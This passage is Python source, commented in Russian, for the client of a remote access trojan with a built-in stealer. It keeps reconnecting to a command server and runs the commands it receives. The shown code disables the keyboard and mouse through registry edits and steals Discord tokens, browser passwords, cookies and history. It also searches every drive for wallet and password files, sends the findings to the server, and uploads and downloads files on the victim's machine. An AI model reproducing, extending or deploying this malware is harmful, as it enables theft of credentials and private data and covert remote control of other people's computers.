                # Отключаем клавиатуру (через реестр)
                subprocess.Popen(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\i8042prt', '/v', 'Start', '/t', 'REG_DWORD', '/d', '4', '/f'], shell=True)
                print("🔒 Клавиатура отключена.")
            elif action == "MOUSE":
                # Отключаем мышь (через реестр)
                subprocess.Popen(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\mouclass', '/v', 'Start', '/t', 'REG_DWORD', '/d', '4', '/f'], shell=True)
                print("🔒 Мышь отключена.")
            elif action == "ENABLE":
                # Включаем ввод (обратная операция)
                subprocess.Popen(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\i8042prt', '/v', 'Start', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True)
                subprocess.Popen(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\mouclass', '/v', 'Start', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True)
                print("🔓 Ввод включён.")
            else:
                print(f"⚠️ Неизвестное действие для отключения ввода: {action}")
                send_data(sock, "ERROR", f"FUNC_DISABLE_INPUT: Unknown action {action}".encode())

        elif cmd.startswith("MOUSE:"):
            # Управление мышью по координатам (остаётся для совместимости)
            _, coords = cmd.split(":", 1)
            try:
                x, y = map(int, coords.split(","))
                move_mouse(x, y)
                print(f"🖱️ Мышь перемещена на ({x}, {y})")
            except ValueError:
                print(f"❌ Неверный формат координат мыши: {coords}")

        # --- НОВОЕ: Обработка команд стиллера ---
        elif cmd.startswith("STEALER:"):
            _, _, action = cmd.partition(":")
            action = action.strip()
            if action == "DISCORD_TOKEN":
                steal_discord_token(sock)
            elif action == "BROWSER_PASSWORDS":
                steal_browser_passwords(sock)
            elif action == "BROWSER_COOKIES":
                steal_browser_cookies(sock)
            elif action == "BROWSER_HISTORY":
                steal_browser_history(sock)
            elif action == "SCREENSHOT_DOWNLOADS":
                steal_downloads_screenshot(sock)
            elif action.startswith("FIND_"):
                ext_map = {"TXT": ".txt", "PDF": ".pdf", "WALLETS": ".wallet", "PASSWORD_FILES": "password"}
                ext = ext_map.get(action[5:]) # FIND_TXT -> TXT -> .txt
                if ext:
                    if ext == "password":
                        # Поиск файлов с "password" в названии
                        drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
                        found_files = []
                        for drive in drives:
                            for root, dirs, files in os.walk(drive, topdown=True):
                                if root.count(os.sep) - drive.count(os.sep) > 3:
                                    del dirs[:]
                                    continue
                                for file in files:
                                    if "password" in file.lower():
                                        found_files.append(os.path.join(root, file))
                                if len(found_files) > 50:
                                    break
                            if len(found_files) > 50:
                                break
                        if found_files:
                            data = "\n".join(found_files).encode()
                            filename = f"found_password_files_{time.strftime('%Y%m%d_%H%M%S')}.txt"
                            send_data(sock, "STEALER_DATA", filename.encode() + b"|" + data)
                            print(f"💎 Найдены и отправлены файлы с 'password': {len(found_files)}")
                        else:
                            send_data(sock, "ERROR", b"STEALER: No password files found")
                    else:
                        find_files(sock, ext)
            elif action == "SCAN_VIRUS":
                scan_virus(sock)
            else:
                send_data(sock, "ERROR", f"STEALER: Unknown action {action}".encode())

        elif cmd.startswith("UPLOAD:"):
            # Загрузка файла на клиент (сервер отправляет содержимое)
            _, file_info = cmd.split(":", 1)
            try:
                filename, file_size_str = file_info.split("|", 1)
                file_size = int(file_size_str)
                print(f"📥 Ожидается загрузка файла: {filename}, размер: {file_size} байт")
                # Получаем содержимое файла
                file_data = b""
                remaining = file_size
                while remaining > 0:
                    chunk = sock.recv(min(4096, remaining))
                    if not chunk:
                        raise ConnectionError("Соединение разорвано при получении файла")
                    file_data += chunk
                    remaining -= len(chunk)
                # Сохраняем файл
                with open(filename, "wb") as f:
                    f.write(file_data)
                print(f"✅ Файл {filename} загружен на клиент.")
                send_data(sock, "UPLOAD_SUCCESS", f"{filename}".encode())
            except Exception as e:
                print(f"❌ Ошибка загрузки файла: {e}")
                send_data(sock, "ERROR", f"UPLOAD: {e}".encode())

        elif cmd.startswith("DOWNLOAD:"):
            # Выгрузка файла с клиента (клиент читает и отправляет)
            _, filepath = cmd.split(":", 1)
            filepath = filepath.strip()
            if os.path.exists(filepath):
                with open(filepath, "rb") as f:
                    file_data = f.read()
                filename = os.path.basename(filepath)
                # Отправляем сначала заголовок с типом и именем/размером
                file_info = f"{filename}|{len(file_data)}"
                send_data(sock, "DOWNLOAD", file_info.encode())
                # Затем отправляем содержимое файла
                sock.sendall(file_data) # Используем sendall для надёжной отправки
                print(f"📤 Файл {filename} выгружен с клиента.")
            else:
                send_data(sock, "ERROR", b"File not found for download")

        elif cmd == "EXIT":
            os._exit(0)

    except Exception as e:
        print(f"❌ Ошибка обработки команды '{cmd}': {e}")
        try:
            send_data(sock, "ERROR", str(e).encode())
        except:
            # Если даже отправка ошибки не удалась, просто выходим
            raise

def recv_exact(sock, num_bytes):
    """Получает ровно num_bytes байт из сокета."""
    data = b''
    while len(data) < num_bytes:
        chunk = sock.recv(num_bytes - len(data))
        if not chunk:
            raise ConnectionError("Соединение разорвано при получении данных")
        data += chunk
    return data

def connect_loop():
    while True:
        sock = None
        try:
            sock = socket.socket()
            # Устанавливаем таймаут на подключение
            sock.settimeout(15)
            print(f"Попытка подключения к {SERVER_HOST}:{SERVER_PORT}...")
            sock.connect((SERVER_HOST, SERVER_PORT))
            print("Подключено!")
            # Отправляем CONNECT в том же формате, что и остальные данные
            send_data(sock, "CONNECT", b"Client ready")
            print("CONNECT пакет отправлен.")
            # Сбрасываем таймаут на сокете для приёма данных
            sock.settimeout(None)

            while True:
                # Принимаем команду от сервера
                # Сервер отправляет команду как строку, без формата
                command_raw = sock.recv(4096) # Команда обычно короткая
                if not command_raw:
                    print("Соединение разорвано сервером (получены пустые данные).")
                    break
                # Команда теперь просто строка, отправленная сервером
                command_str = command_raw.decode('utf-8', errors='ignore')
                print(f"Получена команда: {command_str}")
                handle_command(sock, command_str)

        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
            print(f"Ошибка соединения: {e}. Повтор через {SLEEP_TIME} секунд...")
        except Exception as e:
            print(f"Неожиданная ошибка в connect_loop: {e}. Повтор через {SLEEP_TIME} секунд...")
        finally:
            # Останавливаем все потоки при отключении
            screen_streaming = False
            webcam_streaming = False
            mouse_sync_active = False
            stop_audio_stream() # Останавливает аудио, если оно активно
            if sock:
                try:
                    sock.close()
                except:
                    pass
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    # Установи pyautogui, opencv-python, sounddevice, numpy, pycryptodome, pillow, psutil, pywin32
    try:
        import pyautogui
        import cv2
        import sounddevice as sd
        import numpy as np
        from Crypto.Cipher import AES
        import psutil
        import ctypes
    except ImportError as e:
        print(f"❌ Необходима установка зависимостей: {e}")
        print("pip install pyautogui opencv-python sounddevice numpy pycryptodome pillow psutil pywin32")
        input("Нажмите Enter для выхода...")
        sys.exit(1)

    threading.Thread(target=connect_loop, daemon=True).start()
    while True:
        time.sleep(60)